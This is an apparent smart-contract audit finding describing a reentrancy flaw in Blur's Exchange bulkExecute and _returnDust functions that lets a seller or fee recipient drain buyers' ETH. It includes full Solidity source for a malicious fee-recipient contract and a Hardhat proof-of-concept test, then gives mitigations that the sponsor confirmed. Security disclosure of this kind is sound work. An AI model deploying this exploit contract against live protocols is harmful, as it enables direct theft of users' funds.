[H-01] Direct theft of buyer’s ETH funds
Submitted by 0xdeadbeef0x, also found by adriro, bin2chen, datapunk, hihen, KingNFT, Koolex, Lambda, philogy, rotcivegaf, Trust, V_B, and wait
Exchange.sol#L168Exchange.sol#L565Exchange.sol#L212Exchange.sol#L154
Most severe issue:A Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).
Additional impacts that can be caused by these bugs:
Seller or Fee recipient can cause next in line executions to revert inbulkExecute(by alteringisInternal, insufficient funds, etc..)Seller or Fee recipient can call_executeexternallySeller or Fee recipient can set a caller_remainingETHto 0 (will not get refunded)
Proof of Concept
Background:
The protocol added abulkExecutefunction that allows multiple orders to execute. The implementation is implemented in a way that if an_executeof a single order reverts, it will not break additional or previous successful_executes. It is therefore very important to track actual ETH used by the function.The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the_returnDustfunction andsetupExecutionmodifier. This ensures that calls to_executemust be internal and have proper accounting of remainingETH.Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.
The new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.
There are three main bugs that can be exploited to steal the ETH:
Reentrancy is possible by feeRecipient as long as_executeis not called (_executehas a reentrancyGuard)bulkExecutecan be called with an empty parameter. This allows the caller to not enter_executeand call_returnDust_returnDustsends the entire balance of the contract to the caller.
(Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)
There are two logical scenarios where the heist could originate from:
Malicious seller: The seller can set the fee recipient to a malicious contract.Malicious fee recipient: fee recipient can steal the funds without the help of the seller.
Consider the scenario (#1) where feeRecipient rate 10% of token price 1 ETH:
Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice’s (seller) sell order (lets assume first in line).Bob callsbulkExecutewith4 ETH.1 ETHfor every order.Alice’s sell order gets executed. Fee0.1 ETHis sent to feeRecipient (controlled by Alice).feeRecipientreentersbulkExecutewithemptyarray as parameter and1 WEIof data_returnDustreturns the balance of the contract to feeRecipient3.9 ETH.feeRecipient sends3.1 ETHto seller (or any other beneficiary)feeRecipient callselfdestructopcode that transfers0.9 ETHto Exchange contract. This is in order to keep_executefrom reverting when paying the seller._executepays seller0.9 ETHSellers balance is4 ETH.The rest of the_executecalls bybulkExecutewill get reverted because buyer cannot pay as his funds were stolen.Buyers3 ETHfunds stolen
┌───────────┐            ┌──────────┐         ┌───────────────┐    ┌───────────┐│           │            │          │         │               │    │           ││   Buyer   │            │ Exchange │         │ Fee Recipient │    │  Seller   ││           │            │          │         │               │    │           │└─────┬─────┘            └────┬─────┘         └───────┬───────┘    └─────┬─────┘│                       │                       │                  ││ bulkExecute(4 orders) │                       │                  ││         4 ETH         │                       │                  │├──────────────────────►│                       │                  ││                       │_execute sends 0.1 ETH │                  ││                       ├──────────────────────►│                  ││                       │                       │                  ││                       │ bulkExecute(0 orders) │                  ││                       │         1 WEI         │                  ││                       │◄──────────────────────┤                  ││                       │                       │                  ││                       │    _retrunDust sends  │                  ││                       │         3.9 ETH       │                  ││                       ├──────────────────────►│  Send 3.1 ETH    ││                       │                       ├─────────────────►││                       │ Self destruct send    │                  ││                       │         0.9 ETH       │                  ││                       │◄──────────────────────┤                  ││                       │                       │                  ││                       │_execute sends 0.9 ETH │                  ││                       ├───────────────────────┼─────────────────►││                       │                       │                  ││                       ├──────┐ _execute revert│                  ││                       │      │     3 times    │                  │┌───┴───┐                   │◄─────┘                │              ┌───┴───┐│3 ETH  │                   │                       │              │4 ETH  ││Stolen │                                                          │Balance│└───────┘                                                          └───────┘
Here is a possible implementation of the fee recipient contract:
contract MockFeeReceipient {bool lock;address _seller;uint256 _price;constructor(address seller, uint256 price) {_seller = seller;_price = price;}receive() external payable {Exchange ex = Exchange(msg.sender);if(!lock){lock = true;// first entrance when receiving feeuint256 feeAmount = msg.value;// Create empty calldata for bulkExecute and call itExecution[] memory executions = new Execution[](0);bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);address(ex).call{value: 1}(data);// Now we received All of buyers funds.// Send stolen ETH to seller minus the amount needed in order to keep execution.address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');// selfdestruct and send funds needed to Exchange (to not revert)selfdestruct(payable(msg.sender));}else{// Second entrance after steeling balance// We will get here after getting funds from reentrancy}}}
Important to know:
The exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:
pragma solidity 0.8.17;import { Exchange } from "../Exchange.sol";import { Execution } from "../lib/OrderStructs.sol";contract MockFeeReceipient {bool lock;address _seller;uint256 _price;constructor(address seller, uint256 price) {_seller = seller;_price = price;}receive() external payable {Exchange ex = Exchange(msg.sender);if(!lock){lock = true;// first entrance when receiving feeuint256 feeAmount = msg.value;// Create empty calldata for bulkExecute and call itExecution[] memory executions = new Execution[](0);bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);address(ex).call{value: 1}(data);}else{// Second entrance after steeling balance// We will get here after getting funds from reentrancy}}}
In the POC we talk mostly aboutbulkExecutebutexecuteof a single execution can steal the buyers excessive ETH.
Technical Walkthrough of Scenario
Buyers can callexecuteorbulkExecuteto start an execution of orders.Both functions have asetupExecutionmodifier that stores the amount of ETH the caller has sent for the transactions:
bulkExecuteinExchange.sol:https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168
function bulkExecute(Execution[] calldata executions)externalpayablewhenOpensetupExecution{
setupExecution:https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40
modifier setupExecution() {remainingETH = msg.value;isInternal = true;_;remainingETH = 0;isInternal = false;}
_executewill be called to handle the buy and sell order.
The function has a reentracnyGuard.The function will check that the orders are signed correctly and that both orders match.If everything is OK,_executeFundsTransferwill be called to transfer the buyers funds to the seller and fee recipient
_executeFundsTransfer:https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565
function _executeFundsTransfer(address seller,address buyer,address paymentToken,Fee[] calldata fees,uint256 price) internal {if (msg.sender == buyer && paymentToken == address(0)) {require(remainingETH >= price);remainingETH -= price;}/* Take fee. */uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);/* Transfer remainder to seller. */_transferTo(paymentToken, buyer, seller, receiveAmount);}
Fees are calculated based on the rate set by the seller and send to the fee recipient in_transferFees.
When the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract.
This can be done throughbulkExecution.
bulkExecutioncan be called with an empty array. If so, no_executefunction will be called and therefore no reentrancyGuard will trigger.
At the end ofbulkExecution,_returnDustfunction is called to return excessive funds.
bulkExecute:https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168
function bulkExecute(Execution[] calldata executions)externalpayablewhenOpensetupExecution{/*REFERENCEuint256 executionsLength = executions.length;for (uint8 i=0; i < executionsLength; i++) {bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);(bool success,) = address(this).delegatecall(data);}_returnDust(remainingETH);*/uint256 executionsLength = executions.length;for (uint8 i = 0; i < executionsLength; i++) {
_returnDust:https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212
function _returnDust() private {uint256 _remainingETH = remainingETH;assembly {if gt(_remainingETH, 0) {let callStatus := call(gas(),caller(),selfbalance(),0,0,0,0)}}}
After the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the_executeFundsTransferto not revert and be able to send funds (0.9 ETH) to the seller. This can be done using theselfdestructopcode
After that, the_executefunction will continue and exit normally.bulkExecutewill continue to the next order and call_executewhich will revert.BecausebulkExecutedelegatecalls_executeand continues even after revert, the functionbulkExecutewill complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.
Hardhat Proof of Concept
Add the following test toexecution.test.ts:
describe.only('hack', async () => {let executions: any[];let value: BigNumber;beforeEach(async () => {await updateBalances();const _executions = [];value = BigNumber.from(0);// deploy MockFeeReceipientlet contractFactory = await (hre as any).ethers.getContractFactory("MockFeeReceipient",{},);let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);await contractMockFeeReceipient.deployed();//generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cuttokenId += 1;await mockERC721.mint(alice.address, tokenId);sell = generateOrder(alice, {side: Side.Sell,tokenId,paymentToken: ZERO_ADDRESS,fees: [{rate: 1000,recipient: contractMockFeeReceipient.address,}],});buy = generateOrder(bob, {side: Side.Buy,tokenId,paymentToken: ZERO_ADDRESS});_executions.push({sell: await sell.packNoOracleSig(),buy: await buy.packNoSigs(),});// create 3 more executionstokenId += 1;for (let i = tokenId; i < tokenId + 3; i++) {await mockERC721.mint(thirdParty.address, i);const _sell = generateOrder(thirdParty, {side: Side.Sell,tokenId: i,paymentToken: ZERO_ADDRESS,});const _buy = generateOrder(bob, {side: Side.Buy,tokenId: i,paymentToken: ZERO_ADDRESS,});_executions.push({sell: await _sell.packNoOracleSig(),buy: await _buy.packNoSigs(),});}executions = _executions;});it("steal funds", async () => {let aliceBalanceBefore = await alice.getBalance();//price = 4 ETHvalue = price.mul(4);//call bulkExecutetx = await waitForTx(exchange.connect(bob).bulkExecute(executions, { value  }));let aliceBalanceAfter = await alice.getBalance();let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);//check that alice received all 4 ETHexpect(aliceEarned).to.equal(value);});});
Add the following contract to mocks folder:MockFeeRecipient.sol:
pragma solidity 0.8.17;import { Exchange } from "../Exchange.sol";import { Execution } from "../lib/OrderStructs.sol";contract MockFeeReceipient {bool lock;address _seller;uint256 _price;constructor(address seller, uint256 price) {_seller = seller;_price = price;}receive() external payable {Exchange ex = Exchange(msg.sender);if(!lock){lock = true;// first entrance when receiving feeuint256 feeAmount = msg.value;// Create empty calldata for bulkExecute and call itExecution[] memory executions = new Execution[](0);bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);address(ex).call{value: 1}(data);// Now we received All of buyers funds.// Send stolen ETH to seller minus the amount needed in order to keep execution.address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');// selfdestruct and send funds needed to Exchange (to not revert)selfdestruct(payable(msg.sender));}else{// Second entrance after steeling balance// We will get here after getting funds from reentrancy}}}
Executeyarn testto see that test pass (Alice stole all 4 ETH)
Tools Used
VS code, hardhat
Recommended Mitigation Steps
Put a reentrancyGuard onexecuteandbulkExecutefunctions_refundDustreturn only _remainingETHrevert inbulkExecuteif parameter array is empty.
nonfungible47 (Blur) confirmed and commented:
Both mitigation steps 2 and 3 were added. We cannot addreentrancyGuardto theexecuteandbulkExecutefunctions as it will break the call to_execute. So, a separate guard was added insetupExecutionthat would requireisInternal = false, preventing reentrant calls.